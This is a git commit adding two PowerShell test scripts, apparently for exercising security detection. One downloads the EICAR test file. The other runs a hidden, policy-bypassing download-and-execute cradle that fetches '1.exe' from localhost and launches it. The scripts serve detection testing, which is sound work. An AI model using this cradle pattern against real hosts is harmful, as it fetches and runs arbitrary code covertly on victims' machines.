d68053c84c499f27dd19429c5b6afd59612d0f7b
Daniel E. Turner <DETurner@trustwave.com>
2022-07-26 10:46:30 -0500

    Added modified ps files for automation through Azure extensions.

---
+++ test_pshell_scripts/auto_download_fake_virus.ps1
@@ -0,0 +1,4 @@
+$name = @("death-machine","scary","weird","dragon","monster","wild","shiny","not-a") | Get-Random
+$name = $name + "-virus.txt"
+$path = "$PSScriptRoot\$name"
+Invoke-WebRequest -Uri "https://secure.eicar.org/eicar.com" -OutFile $path
---
+++ test_pshell_scripts/auto_invoice_test.ps1
@@ -0,0 +1,4 @@
+$path = "$PSScriptRoot\invoice.exe"
+$cmd = "& powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', '$path');Start-Process $path"
+write-host $cmd
+Invoke-Expression -Command:$cmd
